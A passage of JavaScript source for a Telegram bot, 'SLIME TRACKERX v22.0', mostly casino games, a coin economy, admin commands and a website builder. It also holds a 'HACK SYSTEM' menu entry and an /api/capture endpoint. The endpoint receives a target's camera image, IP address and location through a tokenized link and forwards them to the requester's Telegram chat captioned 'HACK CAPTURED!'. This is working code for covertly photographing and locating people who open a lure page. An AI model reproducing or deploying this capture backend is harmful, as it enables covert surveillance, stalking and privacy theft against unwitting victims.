    await ctx.reply(`🎡 Ball: ${number} (${color})\n💀 LOSE -${bet} coins`);
  }
});

bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Minimum bet 5 coins!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  let result = [slots[Math.floor(Math.random()*6)], slots[Math.floor(Math.random()*6)], slots[Math.floor(Math.random()*6)]];
  let isJackpot = result[0] === result[1] && result[1] === result[2];
  
  if (isJackpot) {
    let win = bet * 5;
    await addCoin(ctx.from.id, win);
    await ctx.reply(`🎰 ${result.join(" ")} JACKPOT!\n🎉 WIN ${win} coins!`);
  } else {
    await ctx.reply(`🎰 ${result.join(" ")}\n💀 LOSE -${bet} coins`);
  }
});

// ========== LOTTERY ==========
bot.command("lottery", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let action = args[1];
  
  if (action === "buy") {
    let tickets = parseInt(args[2]) || 1;
    let cost = tickets * 5;
    let u = await initUser(ctx.from.id);
    
    if (u.coins < cost) return ctx.reply(`❌ Need ${cost} coins!`);
    
    await takeCoin(ctx.from.id, cost);
    lotteryPool += cost;
    for (let i = 0; i < tickets; i++) lotteryEntries.push(ctx.from.id);
    
    await ctx.reply(`🎫 Bought ${tickets} tickets!\n💰 Jackpot: ${lotteryPool} coins`);
  } else {
    await ctx.reply(`🍀 **LOTTERY**\n\n/lottery buy [tickets] - 5 coins each\n💰 Jackpot: ${lotteryPool} coins`);
  }
});

// ========== TOURNAMENT ==========
bot.command("tournament", async (ctx) => {
  let args = ctx.message.text.split(" ");
  
  if (args[1] === "list") {
    let tours = Array.from(activeTournaments.values());
    if (tours.length === 0) return ctx.reply("📭 No tournaments");
    let msg = "🏆 **TOURNAMENTS**\n\n";
    for (let t of tours) msg += `📛 ${t.name}\n💰 Entry: ${t.entryFee} | Players: ${t.players.length}\n\n`;
    await ctx.reply(msg);
  } else if (args[1] === "join" && args[2]) {
    let tournament = activeTournaments.get(args[2]);
    if (!tournament) return ctx.reply("❌ Not found!");
    
    let user = await initUser(ctx.from.id);
    if (user.coins < tournament.entryFee) return ctx.reply(`❌ Need ${tournament.entryFee} coins!`);
    
    await takeCoin(ctx.from.id, tournament.entryFee);
    tournament.prizePool += tournament.entryFee;
    tournament.players.push(ctx.from.id);
    await tournament.save();
    await ctx.reply(`✅ Joined ${tournament.name}!\n💰 Prize: ${tournament.prizePool} coins`);
  } else if (args[1] === "create" && ctx.from.id === OWNER_ID) {
    let name = args[2];
    let entryFee = parseInt(args[3]);
    let id = crypto.randomBytes(4).toString("hex");
    let tournament = new Tournament({ id, name, entryFee, prizePool: 0, players: [] });
    await tournament.save();
    activeTournaments.set(id, tournament);
    await ctx.reply(`✅ Tournament "${name}" created!\nID: ${id}\nEntry: ${entryFee} coins`);
  } else {
    await ctx.reply(`🏆 **TOURNAMENTS**\n\n/tournament list\n/tournament join [id]\n/tournament create [name] [fee] (admin)`);
  }
});

// ========== QUESTS ==========
bot.command("quests", async (ctx) => {
  let u = await initUser(ctx.from.id);
  let today = new Date().toDateString();
  
  if (!u.dailyQuests[today]) {
    u.dailyQuests[today] = { playGames: 0, winGames: 0, referrals: 0 };
    await saveUser(ctx.from.id, u);
  }
  
  let q = u.dailyQuests[today];
  await ctx.reply(`📋 **DAILY QUESTS**\n\n🎮 Play 5 games: ${q.playGames}/5\n🏆 Win 3 games: ${q.winGames}/3\n👥 Get 2 referrals: ${q.referrals}/2\n\n🎁 Complete all for 50 COINS!`);
});

// ========== SHOP ==========
bot.command("shop", async (ctx) => {
  await ctx.reply(`🛒 **SHOP**\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins\n\nUse /buy [item]`);
});

bot.command("buy", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let item = args[1]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (item === "diamonds") {
    if (u.coins < 50) return ctx.reply("❌ Need 50 coins!");
    await takeCoin(ctx.from.id, 50);
    u.diamonds += 100;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`✅ +100 diamonds!`);
  } else if (item === "ticket") {
    if (u.coins < 5) return ctx.reply("❌ Need 5 coins!");
    await takeCoin(ctx.from.id, 5);
    lotteryPool += 5;
    lotteryEntries.push(ctx.from.id);
    await ctx.reply(`✅ Bought lottery ticket!\n💰 Jackpot: ${lotteryPool}`);
  } else if (item === "mystery") {
    if (u.coins < 20) return ctx.reply("❌ Need 20 coins!");
    await takeCoin(ctx.from.id, 20);
    let reward = [10, 20, 30, 50, 100][Math.floor(Math.random() * 5)];
    await addCoin(ctx.from.id, reward);
    await ctx.reply(`🎁 Mystery Box: ${reward} coins!`);
  } else {
    await ctx.reply("❌ Items: diamonds, ticket, mystery");
  }
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return;
  await ctx.reply(`👑 **ADMIN**\n\n/addcoin @user amount\n/gencode coins\n/broadcast msg\n/users\n/stats\n/banuser @user\n/giveall amount\n/topcoins`);
});

bot.command("addcoin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  if (!user || isNaN(amt)) return;
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.coins += amt; await saveUser(id, u); await ctx.reply(`✅ +${amt} to @${user}`); return; } } catch(e) {}
  }
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let code = await genCode(coins);
  await ctx.reply(`✅ Code: \`${code}\`\n💰 ${coins} coins`, { parse_mode: "Markdown" });
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return;
  let sent = 0;
  for (let [id] of usersCache) {
    try { await ctx.telegram.sendMessage(id, `📢 ${msg}`); sent++; } catch(e) {}
  }
  await ctx.reply(`✅ Sent to ${sent} users`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  await ctx.reply(`📊 Users: ${usersCache.size}`);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let totalCoins = 0;
  for (let u of usersCache.values()) totalCoins += u.coins;
  await ctx.reply(`📊 **STATS**\n\nUsers: ${usersCache.size}\nTotal Coins: ${totalCoins}`);
});

bot.command("banuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.add(id); await ctx.reply(`🚫 Banned @${user}`); return; } } catch(e) {}
  }
});

bot.command("giveall", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return;
  let count = 0;
  for (let [id, u] of usersCache) { u.coins += amount; await saveUser(id, u); count++; }
  await ctx.reply(`✅ Added ${amount} coins to ${count} users`);
});

bot.command("topcoins", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let message = "🏆 **TOP COINS**\n\n";
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    message += `${i+1}. @${name} - ${sorted[i].coins} coins\n`;
  }
  await ctx.reply(message);
});

// ========== BASIC COMMANDS ==========
bot.command("balance", async (ctx) => { let u = await initUser(ctx.from.id); await ctx.reply(`💰 ${u.coins} coins | 💎 ${u.diamonds} diamonds`); });

bot.command("profile", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 ${u.coins} coins\n💎 ${u.diamonds}\n📊 Level ${u.level}\n👥 ${u.referrals} refs\n💀 ${u.hacks} hacks\n🎮 ${u.wins}W/${u.losses}L\n🏆 Badges: ${u.badges.join(", ")}`); 
});

bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000); 
    return ctx.reply(`⏰ ${h}h left`); 
  } 
  let reward = DAILY_REWARD; 
  await addCoin(ctx.from.id, reward); 
  u.lastDaily = new Date(now); 
  await saveUser(ctx.from.id, u); 
  await ctx.reply(`🎁 +${reward} coins!`); 
});

bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < WORK_CD) { 
    let h = Math.floor((WORK_CD - (now - last)) / 3600000); 
    return ctx.reply(`⏰ ${h}h left`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  await addCoin(u.userId, WORK_REWARD); 
  workCD.set(u.userId, now); 
  await ctx.reply(`💼 ${job} +${WORK_REWARD} coin`); 
});

bot.command("redeem", async (ctx) => { 
  let args = ctx.message.text.split(" "); 
  if (args.length < 2) return ctx.reply("❌ Usage: /redeem CODE"); 
  let res = await redeemCode(ctx.from.id, args[1]); 
  await ctx.reply(res.msg); 
});

bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice amount");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll === 6) {
    await addCoin(ctx.from.id, bet * 2);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 🎉 WIN +${bet * 2} coins!`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 💀 LOSE -${bet} coins`);
  }
});

// ========== MAIN MENU - FIXED VERSION ==========
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💀 HACK", callback_data: "menu_track" }, { text: "📝 WORD BATTLE", callback_data: "menu_word" }],
        [{ text: "🌐 WEB CREATOR", callback_data: "menu_web" }, { text: "🎰 CASINO", callback_data: "menu_casino" }],
        [{ text: "🎮 GAMES", callback_data: "menu_games" }, { text: "💰 ECONOMY", callback_data: "menu_eco" }],
        [{ text: "🏆 TOURNAMENT", callback_data: "menu_tournament" }, { text: "📋 QUESTS", callback_data: "menu_quests" }],
        [{ text: "🛒 SHOP", callback_data: "menu_shop" }, { text: "👤 PROFILE", callback_data: "menu_profile" }],
        [{ text: "📊 STATS", callback_data: "menu_stats" }, { text: "🎁 REDEEM", callback_data: "menu_redeem" }],
        [{ text: "🔗 REFERRAL", callback_data: "menu_ref" }, { text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }],
        [{ text: "👨‍💻 DEV", url: "https://t.me/Mrddev" }]
      ]
    }
  };
}

// ========== ACTION HANDLERS ==========
bot.action("menu_track", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("💀 **HACK SYSTEM**\n\nCost: 10 coins\nUse: /hack @username");
});

bot.action("menu_word", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("📝 **WORD BATTLE**\n\nUse: /wordbattle @user amount difficulty");
});

bot.action("menu_web", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🌐 **WEB CREATOR**\n\nUse: /createweb [template]\nTemplates: portfolio, business, store, gaming, restaurant");
});

bot.action("menu_casino", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎰 **CASINO**\n\n/blackjack amount\n/roulette amount color\n/slots amount\n/lottery buy tickets");
});

bot.action("menu_games", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎮 **GAMES**\n\n/dice amount\n/slots amount");
});

bot.action("menu_eco", async (ctx) => {
  await ctx.answerCbQuery();
  let u = await initUser(ctx.from.id);
  await ctx.reply(`💰 **ECONOMY**\n\nBalance: ${u.coins} coins\nDiamonds: ${u.diamonds}\n\n/daily - ${DAILY_REWARD} coins\n/work - ${WORK_REWARD} coins`);
});

bot.action("menu_tournament", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🏆 **TOURNAMENT**\n\n/tournament list\n/tournament join id");
});

bot.action("menu_quests", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("📋 **QUESTS**\n\nUse: /quests");
});

bot.action("menu_shop", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🛒 **SHOP**\n\n/buy diamonds - 100💎 for 50 coins\n/buy ticket - Lottery ticket 5 coins\n/buy mystery - Mystery box 20 coins");
});

bot.action("menu_profile", async (ctx) => {
  await ctx.answerCbQuery();
  let u = await initUser(ctx.from.id);
  await ctx.reply(`👤 **PROFILE**\n\nCoins: ${u.coins}\nLevel: ${u.level}\nReferrals: ${u.referrals}\nHacks: ${u.hacks}`);
});

bot.action("menu_stats", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`📊 **STATS**\n\nUsers: ${usersCache.size}`);
});

bot.action("menu_redeem", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("🎁 **REDEEM**\n\nUse: /redeem CODE");
});

bot.action("menu_ref", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🔗 **REFERRAL**\n\nLink: ${refLink(ctx.from.id)}\n\n${REF_REWARD} coins per referral!`);
});

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  
  let joined = await checkJoin(ctx);
  if (!joined) {
    return ctx.reply(`🚫 **ACCESS LOCKED**\n\nJoin: ${CHANNEL}`, {
      reply_markup: {
        inline_keyboard: [[{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }]]
      }
    });
  }
  return next();
});

// ========== START COMMAND ==========
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) { 
    ref = parseInt(args[1].replace("ref_", "")); 
  }
  let user = await initUser(ctx.from.id, ref);
  
  await ctx.reply(
    `🟢⚡ **SLIME TRACKERX v22.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 📊 Lvl ${user.level}\n👥 ${user.referrals} referrals\n\n🎯 Select a module below:`,
    { parse_mode: "Markdown", ...getMainMenu() }
  );
});

// ========== API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location } = req.body;
    if (!token || !tokens.has(token)) return res.status(400).json({ error: "Invalid" });
    let data = tokens.get(token);
    if (image) {
      let buf = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(data.chat, { source: buf }, { caption: `📸 HACK CAPTURED!\nIP: ${ip}\nLocation: ${location}` });
    }
    tokens.delete(token);
    res.json({ status: "success" });
  } catch(e) { res.status(500).json({ error: "Error" }); }
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
});

app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });

// ========== WEBHOOK/TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
  if (processedMessages.has(msgId)) return;
  processedMessages.add(msgId);
  setTimeout(() => processedMessages.delete(msgId), 5000);
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      if (build.step < build.questions.length) {
        await ctx.reply(`📝 Send ${build.questions[build.step]}:`);
      } else {
        let html = htmlTemplates[build.template](build.data);
        let filename = `website_${ctx.from.id}_${Date.now()}.html`;
        let filepath = path.join(__dirname, "websites", filename);
        await fs.writeFile(filepath, html);
        
        await ctx.replyWithDocument({ source: filepath, filename: `${build.data[build.questions[0]] || 'website'}.html` });
        await ctx.reply(`✅ **WEBSITE CREATED!**\n\nURL: ${DOMAIN}/websites/${filename}`);
        
        let website = new Website({ name: build.data[build.questions[0]], ownerId: ctx.from.id, template: build.template, url: `${DOMAIN}/websites/${filename}` });
        await website.save();
        await fs.remove(filepath);
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  // Word challenge response
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      if (answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        let totalPot = challenge.bet * 2;
        await addCoin(challenge.from, totalPot);
        await ctx.reply(`🎉 CORRECT! Won ${totalPot} coins!`);
        await ctx.telegram.sendMessage(challengedId, `💀 You lost! Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        await ctx.reply(`❌ WRONG! Needed ${challenge.letterCount} letters! Lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 You win! Won ${challenge.bet * 2} coins!`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v22.0 LIVE!`);
  } catch(e) {
    console.log("Error:", e.message);
  }
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
